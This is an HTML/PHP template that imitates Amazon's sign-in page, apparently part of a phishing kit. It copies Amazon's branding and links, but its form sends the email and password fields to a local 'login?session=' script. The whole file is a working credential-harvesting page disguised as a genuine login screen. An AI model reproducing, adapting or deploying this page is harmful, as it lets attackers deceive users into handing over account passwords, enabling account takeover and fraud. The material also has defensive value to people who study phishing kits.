<!doctype html>
<html class="a-no-js" data-19ax5a9jf="dingo">
<head>
	<script type='text/javascript'>
	var ue_t0=ue_t0||+new Date();
	</script>
	<meta charset="utf-8">
	<link rel='icon' href='../assets/img/favicon.ico'>
	<title dir="ltr"><?php echo $lang['login']['title'];?></title>
	<link rel="stylesheet" href="../assets/css/main.css" />
</head>
<body class="ap-locale-en_US a-m-us a-aui_149818-c a-aui_152852-c a-aui_157141-c a-aui_158613-c a-aui_160684-c a-aui_57326-c a-aui_72554-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_113788-c a-aui_ux_114039-c a-aui_ux_138741-c a-aui_ux_145937-c a-aui_ux_60000-c">
	<div id="a-page">
		<div class="a-section a-padding-medium auth-workflow">
			<div class="a-section a-spacing-none auth-navbar">
				<div class="a-section a-spacing-medium a-text-center">
					<a class="a-link-nav-icon" tabindex="-1" href="&#x2F;ref=ap_frn_logo">
						<i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i></a>
					</div>
				</div>
				<div id="authportal-center-section" class="a-section">
					<div id="authportal-main-section" class="a-section">
						<div class="a-section auth-pagelet-container">
<div class="a-section a-spacing-base">
	<div class="a-section">
		<form name="signIn" method="post" novalidate action="login?session=<?php echo $key;?>" class="auth-validate-form auth-real-time-validation a-spacing-none">
			<div class="a-section">
				<div class="a-box">
					<div class="a-box-inner a-padding-extra-large">
						<h1 class="a-spacing-small">
                <?php echo $lang['login']['signin'];?>
              </h1>
						<!-- optional subheading element -->
						<div class="a-row a-spacing-base">
							<label for="ap_email" class="a-form-label">
                  <?php echo $lang['login']['email'];?>
                </label>
							<input type="email" maxlength="128" id="ap_email" name="emailLogin" tabindex="1" class="a-input-text a-span12 auth-autofocus auth-required-field">
								<div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
									<div class="a-box-inner a-alert-container">
										<i class="a-icon a-icon-alert"></i>
										<div class="a-alert-content">
  Enter your email or mobile phone number
</div>
									</div>
								</div>
							</div>
							<input type="hidden" name="create" value="0">
								<div class="a-section a-spacing-large">
									<div class="a-row">
										<div class="a-column a-span5">
											<label for="ap_password" class="a-form-label">


            <?php echo $lang['login']['password'];?>



      </label>
										</div>
										<div class="a-column a-span7 a-text-right a-span-last">
											<a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3" href="https://www.amazon.com/ap/forgotpassword?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&amp;prevRID=5E2S0M02YQK0KWXY6QRW&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">
  <?php echo $lang['login']['forgot'];?>
</a>
										</div>
									</div>
									<input type="password" id="ap_password" name="passwordLogin" tabindex="2" class="a-input-text a-span12 auth-required-field">
										<div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
											<div class="a-box-inner a-alert-container">
												<i class="a-icon a-icon-alert"></i>
												<div class="a-alert-content">
  Enter your password
</div>
											</div>
										</div>
									</div>
									<div class="a-section a-spacing-extra-large">
										<span class="a-button a-button-span12 a-button-primary">
											<span class="a-button-inner">
												<input id="signInSubmit" tabindex="5" class="a-button-input" type="submit">
													<span class="a-button-text" aria-hidden="true">
                  <?php echo $lang['login']['signin'];?>
                </span>
												</span>
											</span>
											<div class="a-row a-spacing-top-medium">
												<div class="a-section a-text-left">
													<label for="auth-remember-me" class="a-form-label">
														<div data-a-input-name="rememberMe" class="a-checkbox">
															<label>
																<input type="checkbox" name="rememberMe" value="true" tabindex="4">
																	<i class="a-icon a-icon-checkbox"></i>
																	<span class="a-label a-checkbox-label">
          <?php echo $lang['login']['remember'];?>

																		<span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;&lt;p&gt;Choosing \&quot;Keep me signed in\&quot; reduces the number of times you're asked to sign in on this device.&lt;\/p&gt;\n&lt;p&gt;To keep your account secure, use this option only on your personal devices.&lt;\/p&gt;&quot;}">
																			<a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative">
              <?php echo $lang['login']['details'];?>

																				<i class="a-icon a-icon-popover"></i>
																			</a>
																		</span>
																	</span>
																</label>
															</div>
														</label>
													</div>
												</div>
											</div>
											<div class="a-divider a-divider-break">
												<h5><?php echo $lang['login']['new'];?></h5>
											</div>
											<span id="auth-create-account-link" class="a-button a-button-span12 a-button-base">
												<span class="a-button-inner">
													<a id="createAccountSubmit" tabindex="6" href="https:&#x2F;&#x2F;www.amazon.com&#x2F;ap&#x2F;register?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2F%3Fref_%3Dnav_ya_signin&amp;prevRID=5E2S0M02YQK0KWXY6QRW&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0" class="a-button-text" role="button">
                      <?php echo $lang['login']['create'];?>
                    </a>
												</span>
											</span>
										</div>
									</div>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="right-2"></div>
		<div class="a-section a-spacing-top-extra-large auth-footer">
			<div class="a-divider a-divider-section">
				<div class="a-divider-inner"></div>
			</div>
			<div class="a-section a-spacing-small a-text-center a-size-mini">
				<span class="auth-footer-seperator"></span>
				<a class="a-link-normal" target="_blank" rel="noopener" href="&#x2F;gp&#x2F;help&#x2F;customer&#x2F;display.html&#x2F;ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">
      <?php echo $lang['footer']['condi'];?>
    </a>
				<span class="auth-footer-seperator"></span>
				<a class="a-link-normal" target="_blank" rel="noopener" href="&#x2F;gp&#x2F;help&#x2F;customer&#x2F;display.html&#x2F;ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">
      <?php echo $lang['footer']['privacy'];?>
    </a>
				<span class="auth-footer-seperator"></span>
				<a class="a-link-normal" target="_blank" rel="noopener" href="&#x2F;help">
      <?php echo $lang['footer']['help'];?>
    </a>
				<span class="auth-footer-seperator"></span>
			</div>
			<div class="a-section a-spacing-none a-text-center">
				<span class="a-size-mini a-color-secondary">
  <?php echo $lang['footer']['copyright'];?>
</span>
			</div>
		</div>
	</div>
	<div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts=""></div>
	<!-- cache slot rendered -->
</div>
<div id='be' style="display:none;visibility:hidden;">
	<form name='ue_backdetect' action="get">
		<input type="hidden" name='ue_back' value='1' />
	</form>
</div></body></html>
